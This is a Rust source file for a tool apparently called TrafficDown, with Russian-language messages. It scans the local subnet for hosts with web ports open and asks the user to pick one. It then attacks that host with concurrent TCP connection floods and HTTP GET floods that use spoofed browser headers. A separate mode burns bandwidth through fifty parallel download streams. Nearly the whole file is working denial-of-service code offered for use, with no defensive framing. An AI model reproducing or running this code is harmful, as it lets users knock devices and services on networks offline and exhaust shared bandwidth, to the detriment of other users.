use anyhow::{Result, anyhow};
use colored::Colorize;
use local_ip_address::local_ip;
use rand::{distributions::Alphanumeric, Rng};
use reqwest::{self, header};
use socket2::{Domain, Protocol, Socket, Type};
use std::net::{IpAddr, SocketAddr};
use std::str::FromStr;
use std::sync::{
    atomic::{AtomicBool, AtomicU64, Ordering},
    Arc, Mutex,
};
use std::time::{Duration, Instant};
use tokio::sync::Mutex as AsyncMutex;
use tokio::time::sleep;
use crate::servers;
use futures_util::StreamExt;

const LOGO: &str = r#"████████╗██████╗░░█████╗░███████╗███████╗██╗░█████╗░██████╗░░█████╗░░██╗░░░░░░░██╗███╗░░██╗
╚══██╔══╝██╔══██╗██╔══██╗██╔════╝██╔════╝██║██╔══██╗██╔══██╗██╔══██╗░██║░░██╗░░██║████╗░██║
░░░██║░░░██████╔╝███████║█████╗░░█████╗░░██║██║░░╚═╝██║░░██║██║░░██║░╚██╗████╗██╔╝██╔██╗██║
░░░██║░░░██╔══██╗██╔══██║██╔══╝░░██╔══╝░░██║██║░░██╗██║░░██║██║░░██║░░████╔═████║░██║╚████║
░░░██║░░░██║░░██║██║░░██║██║░░░░░██║░░░░░██║╚█████╔╝██████╔╝╚█████╔╝░░╚██╔╝░╚██╔╝░██║░╚███║
░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝░░░░░╚═╝░╚════╝░╚═════╝░░╚════╝░░░░╚═╝░░░╚═╝░░╚═╝░░╚══╝"#;

pub const LOGO_WIDTH: usize = 91;

#[derive(Debug, Clone)]
pub struct NetworkClient {
    pub ip: IpAddr,
    pub ports: Vec<u16>,
}

pub struct NetworkStresser {
    running: Arc<AtomicBool>,
    total_bytes: Arc<AtomicU64>,
    ports: Vec<u16>,
    max_threads: usize,
    active_downloads: Arc<AtomicU64>,
    urls: Arc<AsyncMutex<Vec<String>>>,
    pub status_message: Arc<Mutex<String>>,
}

impl NetworkStresser {
    pub fn new() -> Self {
        Self {
            running: Arc::new(AtomicBool::new(false)),
            total_bytes: Arc::new(AtomicU64::new(0)),
            ports: vec![80, 443, 8080, 8443],
            max_threads: 50,
            active_downloads: Arc::new(AtomicU64::new(0)),
            urls: Arc::new(AsyncMutex::new(Vec::new())),
            status_message: Arc::new(Mutex::new("Готов к работе".to_string())),
        }
    }

    pub fn generate_random_data(&self, size: usize) -> Vec<u8> {
        let mut rng = rand::thread_rng();
        (0..size)
            .map(|_| rng.sample(Alphanumeric) as u8)
            .collect()
    }

    pub async fn scan_network(&self) -> Result<(Vec<NetworkClient>, IpAddr)> {
        let local_ip = match local_ip() {
            Ok(ip) => ip,
            Err(_) => return Err(anyhow!("Не удалось получить локальный IP-адрес")),
        };

        if let IpAddr::V4(ipv4) = local_ip {
            let network_prefix = format!("{}.{}.{}.", ipv4.octets()[0], ipv4.octets()[1], ipv4.octets()[2]);
            let mut clients = Vec::new();

            println!("{}", format!("[*] Сканируем сеть {}.0/24...", network_prefix).yellow());
            
            let mut handles = Vec::new();
            for i in 1..255 {
                let ip_str = format!("{}{}", network_prefix, i);
                
                let handle = tokio::spawn(async move {
                    if let Ok(ip) = IpAddr::from_str(&ip_str) {
                        if let Ok(ports) = check_ports(ip).await {
                            if !ports.is_empty() {
                                return Some(NetworkClient { ip, ports });
                            }
                        }
                    }
                    None
                });
                
                handles.push(handle);
            }

            for handle in handles {
                if let Ok(Some(client)) = handle.await {
                    clients.push(client);
                }
            }

            Ok((clients, local_ip))
        } else {
            Err(anyhow!("Только IPv4 поддерживается"))
        }
    }

    pub async fn connection_flood(&self, target_ip: IpAddr, port: u16) {
        while self.running.load(Ordering::Relaxed) {
            if let Ok(socket) = Socket::new(Domain::IPV4, Type::STREAM, Some(Protocol::TCP)) {
                let addr = SocketAddr::new(target_ip, port);
                if socket.connect(&addr.into()).is_ok() {
                    let _ = socket.set_nonblocking(false);
                    let random_data = self.generate_random_data(1024);
                    let _ = socket.send(&random_data);
                    sleep(Duration::from_millis(100)).await;
                }
            }
            sleep(Duration::from_millis(10)).await;
        }
    }

    pub async fn http_flood(&self, target_ip: IpAddr) {
        let client = reqwest::Client::builder()
            .danger_accept_invalid_certs(true)
            .build()
            .unwrap_or_default();

        let headers = header::HeaderMap::from_iter([
            (header::USER_AGENT, header::HeaderValue::from_static("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")),
            (header::ACCEPT, header::HeaderValue::from_static("text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")),
            (header::ACCEPT_LANGUAGE, header::HeaderValue::from_static("en-US,en;q=0.5")),
            (header::ACCEPT_ENCODING, header::HeaderValue::from_static("gzip, deflate")),
            (header::CONNECTION, header::HeaderValue::from_static("keep-alive")),
        ]);

        while self.running.load(Ordering::Relaxed) {
            for port in [80, 443] {
                let protocol = if port == 443 { "https" } else { "http" };
                let url = format!("{}://{}", protocol, target_ip);
                
                let _ = client.get(&url)
                    .headers(headers.clone())
                    .timeout(Duration::from_secs(1))
                    .send()
                    .await;
            }
            sleep(Duration::from_millis(10)).await;
        }
    }

    pub async fn start_network_flood(&self, target_ip: IpAddr) {
        self.running.store(true, Ordering::Relaxed);
        
        let mut handles = Vec::new();
        
        for port in &self.ports {
            for _ in 0..5 {
                let stresser = self.clone();
                let port = *port;
                let target = target_ip;
                
                let handle = tokio::spawn(async move {
                    stresser.connection_flood(target, port).await;
                });
                
                handles.push(handle);
            }
        }
        
        for _ in 0..10 {
            let stresser = self.clone();
            let target = target_ip;
            
            let handle = tokio::spawn(async move {
                stresser.http_flood(target).await;
            });
            
            handles.push(handle);
        }
    }

    pub fn stop_network_flood(&self) {
        self.running.store(false, Ordering::Relaxed);
    }

    pub async fn scan_and_attack(&self) -> Result<()> {
        println!("{}", "[*] Сканируем сеть...".yellow());
        
        let (clients, _local_ip) = self.scan_network().await?;
        
        if clients.is_empty() {
            println!("{}", "[-] Устройства не найдены".red());
            return Ok(());
        }
        
        println!("\n{}", "Доступные устройства:".green());
        for (i, client) in clients.iter().enumerate() {
            let ports_str = client.ports.iter().map(|p| p.to_string()).collect::<Vec<_>>().join(", ");
            println!("{}. IP: {}\tОткрытые порты: {}", i + 1, client.ip, ports_str);
        }
        
        println!("\n{}", "Выберите цель (номер устройства):".cyan());
        let mut choice = String::new();
        std::io::stdin().read_line(&mut choice)?;
        
        let choice: usize = match choice.trim().parse() {
            Ok(num) if num > 0 && num <= clients.len() => num,
            _ => {
                println!("{}", "[-] Неверный выбор!".red());
                return Ok(());
            }
        };
        
        let target = &clients[choice - 1];
        println!("\n{}", format!("[*] Атакуем {}...", target.ip).yellow());
        
        self.start_network_flood(target.ip).await;
        
        println!("\n{}", "Нажмите Enter для остановки...".red());
        let mut input = String::new();
        std::io::stdin().read_line(&mut input)?;
        
        self.stop_network_flood();
        
        Ok(())
    }

    pub async fn traffic_down(&self) -> Result<()> {
        *self.status_message.lock().unwrap() = "Тестируем скорость серверов...".to_string();
        println!("{}", "[*] Тестируем скорость серверов...".yellow());
        
        let sorted_urls = match servers::get_sorted_urls().await {
            Ok(urls) => urls,
            Err(_) => {
                println!("{}", "[-] Нет доступных серверов!".red());
                return Ok(());
            }
        };
        
        if sorted_urls.is_empty() {
            println!("{}", "[-] Нет доступных серверов!".red());
            return Ok(());
        }
        
        println!("{}", format!("[+] Найдено {} рабочих серверов", sorted_urls.len()).green());
        
        self.running.store(true, Ordering::Relaxed);
        self.total_bytes.store(0, Ordering::Relaxed);
        self.active_downloads.store(0, Ordering::Relaxed);
        
        *self.urls.lock().await = sorted_urls;
        
        let stresser = self.clone();
        tokio::spawn(async move {
            stresser.manage_downloads().await;
        });

        Ok(())
    }

    async fn manage_downloads(&self) {
        let mut last_update = Instant::now();
        
        while self.running.load(Ordering::Relaxed) {
            let active = self.active_downloads.load(Ordering::Relaxed) as usize;
            
            if active < self.max_threads {
                let needed = self.max_threads - active;
                let urls = self.urls.lock().await.clone();
                let available_urls = urls.into_iter().take(needed);
                
                for url in available_urls {
                    let stresser = self.clone();
                    tokio::spawn(async move {
                        stresser.active_downloads.fetch_add(1, Ordering::Relaxed);
                        if let Err(e) = stresser.download_thread(url).await {
                            eprintln!("\n{}", format!("[-] Ошибка в потоке: {}", e).red());
                        }
                        stresser.active_downloads.fetch_sub(1, Ordering::Relaxed);
                    });
                }
            }
            
            let current_time = Instant::now();
            if current_time.duration_since(last_update) >= Duration::from_secs(1) {
                let total_bytes = self.total_bytes.load(Ordering::Relaxed);
                let elapsed = current_time.duration_since(last_update).as_secs_f64();
                let speed = (total_bytes as f64) / elapsed / (1024.0 * 1024.0);
                
                let total_gb = (total_bytes as f64) / (1024.0 * 1024.0 * 1024.0);
                let status = format!(
                    "Скачано: {:.2} GB | Скорость: {:.2} MB/s | Потоков: {}",
                    total_gb,
                    speed,
                    self.active_downloads.load(Ordering::Relaxed)
                );
                
                println!("\r{}", status.green());
                *self.status_message.lock().unwrap() = status;
                
                self.total_bytes.store(0, Ordering::Relaxed);
                last_update = current_time;
            }
            
            sleep(Duration::from_millis(100)).await;
        }
    }

    async fn download_thread(&self, url: String) -> Result<()> {
        let client = reqwest::Client::builder()
            .danger_accept_invalid_certs(true)
            .build()?;

        let headers = header::HeaderMap::from_iter([
            (header::USER_AGENT, header::HeaderValue::from_static("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")),
            (header::ACCEPT, header::HeaderValue::from_static("*/*")),
            (header::ACCEPT_ENCODING, header::HeaderValue::from_static("gzip, deflate")),
            (header::CONNECTION, header::HeaderValue::from_static("keep-alive")),
        ]);

        let _chunk_size = 1024 * 1024;
        
        while self.running.load(Ordering::Relaxed) {
            match client.get(&url).headers(headers.clone()).send().await {
                Ok(response) => {
                    let mut stream = response.bytes_stream();
                    
                    while let Some(chunk_result) = stream.next().await {
                        if !self.running.load(Ordering::Relaxed) {
                            break;
                        }
                        
                        if let Ok(chunk) = chunk_result {
                            self.total_bytes.fetch_add(chunk.len() as u64, Ordering::Relaxed);
                        } else {
                            break;
                        }
                    }
                }
                Err(_) => {
                    sleep(Duration::from_millis(500)).await;
                }
            }
        }
        
        Ok(())
    }
}

impl Clone for NetworkStresser {
    fn clone(&self) -> Self {
        Self {
            running: Arc::clone(&self.running),
            total_bytes: Arc::clone(&self.total_bytes),
            ports: self.ports.clone(),
            max_threads: self.max_threads,
            active_downloads: Arc::clone(&self.active_downloads),
            urls: Arc::clone(&self.urls),
            status_message: Arc::clone(&self.status_message),
        }
    }
}

pub fn print_logo(width: usize) {
    if width >= LOGO_WIDTH {
        let spaces = " ".repeat((width / 2) - (LOGO_WIDTH / 2));
        for line in LOGO.lines() {
            println!("{}{}", spaces, line.white());
        }
    } else {
        let text = "(увеличь окно или уменьши размер текста)";
        let spaces = " ".repeat((width / 2) - (text.len() / 2));
        println!("{}{}", spaces, text.white());
    }
}

async fn check_ports(ip: IpAddr) -> Result<Vec<u16>> {
    let ports_to_check = vec![80, 443, 8080, 8443];
    let mut open_ports = Vec::new();

    for port in ports_to_check {
        let socket_addr = SocketAddr::new(ip, port);
        let timeout = Duration::from_millis(100);

        if let Ok(_) = tokio::time::timeout(timeout, tokio::net::TcpStream::connect(socket_addr)).await {
            open_ports.push(port);
        }
    }

    Ok(open_ports)
} 